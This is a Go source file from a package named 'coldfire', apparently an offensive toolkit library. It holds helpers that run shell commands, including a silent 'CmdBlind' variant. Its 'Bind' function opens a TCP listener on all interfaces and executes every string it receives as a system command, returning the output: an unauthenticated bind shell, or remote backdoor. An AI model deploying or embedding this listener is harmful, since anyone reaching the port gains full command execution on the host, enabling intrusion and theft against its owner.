package coldfire

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

// CmdOut executes a given command and returns its output.
func CmdOut(command string) (string, error) {
	return cmdOut(command)
}

// CmdOutPlatform executes a given set of commands based on the OS of the machine.
func CmdOutPlatform(commands map[string]string) (string, error) {
	cmd := commands[runtime.GOOS]
	out, err := CmdOut(cmd)
	if err != nil {
		return "", err
	}

	return out, nil
}

// CmdRun executes a command and writes output as well
// as error to STDOUT.
func CmdRun(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		PrintError(err.Error())
		fmt.Println(string(output))
	} else {
		fmt.Println(string(output))
	}
}

// CmdBlind runs a command without any side effects.
func CmdBlind(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	_, _ = cmd.CombinedOutput()
}

// CmdDir executes commands which are mapped to a string
// indicating the directory where the command is executed.
func CmdDir(dirs_cmd map[string]string) ([]string, error) {
	outs := []string{}
	for dir, cmd := range dirs_cmd {
		err := os.Chdir(dir)
		if err != nil {
			return nil, err
		}

		o, err := CmdOut(cmd)
		if err != nil {
			return nil, err
		}
		outs = append(outs, o)
	}

	return outs, nil
}

// Bind tells the process to listen to a local port
// for commands.
func Bind(port int) {
	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	ExitOnError(err)
	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			PrintError("Cannot bind to selected port")
		}
		handleBind(conn)
	}
}

func handleBind(conn net.Conn) {
	for {
		buffer := make([]byte, 1024)
		length, _ := conn.Read(buffer)
		command := string(buffer[:length-1])
		out, _ := CmdOut(command)
		conn.Write([]byte(out))
	}
}
